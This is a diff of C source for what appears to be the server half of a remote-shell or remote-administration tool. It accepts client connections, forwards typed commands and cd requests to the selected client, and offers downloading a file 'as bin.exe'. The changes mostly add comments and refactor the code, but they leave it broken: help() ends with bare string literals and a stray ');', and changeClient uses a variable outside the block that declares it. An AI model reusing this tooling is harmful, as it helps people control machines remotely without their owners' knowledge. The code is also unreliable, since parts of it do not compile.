@@ -14,21 +14,26 @@
 	serverThread.allDone = 1;
 	pid_t pidToConnection;
 
-	pipe(fd);
+	pipe(fd);		// setup pipe to transfer data between the two parts
+
 	bnlisten(inf);
 	printFirstScreen(inf);
 
 	while (1) {
-		loop:
+		//loop:		// try removing this i think its useless
 
-		ansetupcon(inf, sock);
-		printAcceptedConnection(inf, inf->hostaddrp);
+		ansetupcon(inf, sock);		// accept a connection
+		printAcceptedConnection(inf, inf->hostaddrp);	// print that a connection has been accepted
 		write(*(serverThread.saved_sockets + sock), sessionid, strlen(sessionid));
-
 		//write to socket the session id to tell p4p1-o if in server or netcat
+
+
 		serverThread.cliNum++;	//update the numofclient character
 		if(serverThread.cliNum == '1')
-			pidToConnection = fork();
+			pidToConnection = fork();	// fork if its the first clien
+							// this part make the next socket to be ignored
+							// by the client handler and its really shity.
+							// you cant just use a socket like that
 
 		if(pidToConnection == 0){ // child process
 			close(fd[1]);
@@ -40,9 +45,12 @@
 			while(1){
 
 				loop = connection_handler(sock, inf);
-				if (serverThread.ncurses){ clearmain(); }
-				if(loop == 2){
+				if (serverThread.ncurses) clearmain();
 
+				if(loop == 2){
+						/* In this part we update the sockets that have been
+						 * Accepted on the other end of the fork.
+						 */
 					t_sock++;
 					read(fd[0], readBuf, sizeof(readBuf));
 					int temp_s = atoi(readBuf);
@@ -50,7 +58,8 @@
 
 				} else if(loop == 1) {
 
-					break;
+					break;	// exit command executed
+						// i should be happy because this works
 
 				} else {
 					randptoScreen(sock);
@@ -68,12 +77,13 @@
 			if(serverThread.cliNum == '1'){
 				close(fd[0]);
 			} else {
+				// save the socket to a var and send it throu the pipe
 				sprintf(sockBuf, "%d", *(serverThread.saved_sockets+sock));
 				write(fd[1], sockBuf, sizeof(sockBuf));
 			}
 
 			sock++; // keep track of how many clients connected
-			goto loop;
+			//goto loop;
 
 		}
 
@@ -94,11 +104,13 @@ int connection_handler(int t, struct server_info * inf)
 	for(int i = 0 ; i < BUFSIZE; i++){ serverThread.buf[i] = '\0'; }
 
 
-	while (t != serverThread.connectedTo)
-		;
-	printPrompt(s);
+	while (t != serverThread.connectedTo)	// wait for beeing connected to this socket
+		;				// this code is wierd i understand it but cant explain it
+						// its more of an if than a while and its why i love c so much
+						// because this is code :)
+	printPrompt(s);		// print the prompt
 
-	return commandInterpreter(inf, &t);;
+	return commandInterpreter(inf, &t);		// interpret commands ....
 
 }
 
@@ -138,7 +150,7 @@ void bnlisten(struct server_info * inf)
 }
 
 /*
- * accept and setup the connection
+ * accept a connection and save its ip to hostaddrp
  */
 void ansetupcon(struct server_info * inf, int sock)
 {
@@ -173,7 +185,8 @@ void printFirstScreen(struct server_info * inf)
 		refresh();
 	} else if(serverThread.cmd){
 		printlogo(inf);
-		printf("[!] Listening on %s:%d\n", inf->ip, inf->portno);
+		printf("[*] Welcome %s\n"
+		       "[!] Listening on %s:%d\n", inf->username, inf->ip, inf->portno);
 	}
 
 }
@@ -223,10 +236,10 @@ void help()
 {
 	if (serverThread.cmd){
 		printf("Help:\n");
-		printf("	- Help -> show this message\n");
-		printf("	- update -> accept new connection!\n");
-		printf("	- download -> download a file as bin.exe\n");
-		printf("	change its name if you want an other extention\n");
+		       "	- Help -> show this message\n"
+		       "	- update -> accept new connection!\n"
+		       "	- download -> download a file as bin.exe\n"
+		       "	change its name if you want an other extention\n");
 	} else if(serverThread.ncurses) {
 		mvprintw(8, 0, "Help:\n");
 		mvprintw(9, 0, "	- Help -> show this message\n");
@@ -281,35 +294,51 @@ void changeClient(int * t)
 		printf("CliNum -%c- -%d- #> ", serverThread.cliNum, *t);
 		fgets(chclin, BUFSIZE, stdin);
 
-		if(!strcmp(chclin, "+\n")){
-
-			*t += 1;
-
-		} else if(!strcmp(chclin, "-\n")){
-
-			*t -= 1;
-
-		} else{
-			printf("[!] Unknown command!\n");
-		}
-
 	} else if (serverThread.ncurses){
 		char chclin[BUFSIZE];
 		getmaxyx(stdscr, row, col);
 		mvprintw(row-1, 0,"CliNum -%c- -%d- #> ", serverThread.cliNum, *t);
 		fgets(chclin, BUFSIZE, stdin);
 
-		if(!strcmp(chclin, "+\n")){
+	}
+	if(!strcmp(chclin, "+\n")){
 
-			*t += 1;
+		*t += 1;
 
-		} else if(!strcmp(chclin, "-\n")){
+	} else if(!strcmp(chclin, "-\n")){
 
-			*t -= 1;
+		*t -= 1;
 
-		} else{
+	} else{
+		if(serverThread.cmd)
+			printf("[!] Unknown command!\n");
+		else
 			mvprintw(8, 0, "[!] Unknown command !");
-		}
+	}
+}
+
+/*
+ * function to make client change directory
+ **/
+void change_dir()
+{
+	char prompt[80];
+	char dir[BUFSIZE];
+	for(int i = 3, q = 0; i < strlen(serverThread.buf); i++, q++){
+		dir[q] = serverThread.buf[i];
+	}
+	write(*(serverThread.saved_sockets+inc), serverThread.buf, strlen(serverThread.buf));
+	read(*(serverThread.saved_sockets+inc), prompt, sizeof(prompt));
+
+	for(int i = 0; i < 80; i++){ prompt[i] = '\0';}
+
+	write(*(serverThread.saved_sockets+inc), dir, strlen(dir));
+	read(*(serverThread.saved_sockets+inc), prompt, sizeof(prompt));
+
+	if(serverThread.cmd){
+		printf("%s\n", prompt);
+	} else if (serverThread.ncurses){
+		mvprintw(8, 0,"%s", prompt);
 	}
 }
 
@@ -343,24 +372,7 @@ int commandInterpreter(struct server_info * inf, int * t)
 
 	} else if(serverThread.buf[0] == 'c' && serverThread.buf[1] == 'd'){
 
-		char prompt[80];
-		char dir[BUFSIZE];
-		for(int i = 3, q = 0; i < strlen(serverThread.buf); i++, q++){
-			dir[q] = serverThread.buf[i];
-		}
-		write(*(serverThread.saved_sockets+inc), serverThread.buf, strlen(serverThread.buf));
-		read(*(serverThread.saved_sockets+inc), prompt, sizeof(prompt));
-
-		for(int i = 0; i < 80; i++){ prompt[i] = '\0';}
-
-		write(*(serverThread.saved_sockets+inc), dir, strlen(dir));
-		read(*(serverThread.saved_sockets+inc), prompt, sizeof(prompt));
-
-		if(serverThread.cmd){
-			printf("%s\n", prompt);
-		} else if (serverThread.ncurses){
-			mvprintw(8, 0,"%s", prompt);
-		}
+		change_dir();
 
 	} else {
 		write(*(serverThread.saved_sockets+inc), serverThread.buf, strlen(serverThread.buf));
